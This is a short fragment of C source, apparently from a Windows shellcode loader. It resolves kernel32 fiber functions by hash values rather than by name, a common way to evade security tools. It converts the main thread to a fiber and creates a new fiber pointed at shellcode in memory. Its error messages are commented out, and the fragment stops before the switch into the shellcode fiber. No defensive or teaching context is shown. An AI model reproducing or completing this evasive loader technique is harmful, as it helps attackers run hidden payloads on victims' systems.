...
int main() {
    ...
    // Dynamically load fiber-related APIs
    ConvertThreadToFiber_t pConvertThreadToFiber = (ConvertThreadToFiber_t)getAPIAddr(krnlAddr, 675890313501);
    CreateFiber_t pCreateFiber = (CreateFiber_t)getAPIAddr(krnlAddr, 34297347);
    SwitchToFiber_t pSwitchToFiber = (SwitchToFiber_t)getAPIAddr(krnlAddr, 318579888);

    // Convert the main thread to a fiber
    LPVOID mainFiber = pConvertThreadToFiber(NULL);
    if (mainFiber == NULL) {
        //PRINTA("[-] Failed to convert thread to fiber\n");
        return -1;
    }

    // Create a new fiber to execute the shellcode
    LPVOID shellcodeFiber = pCreateFiber(0, FiberProc, BaseAddress);
    if (shellcodeFiber == NULL) {
        //PRINTA("[-] Failed to create fiber\n");
        return -1;
    }
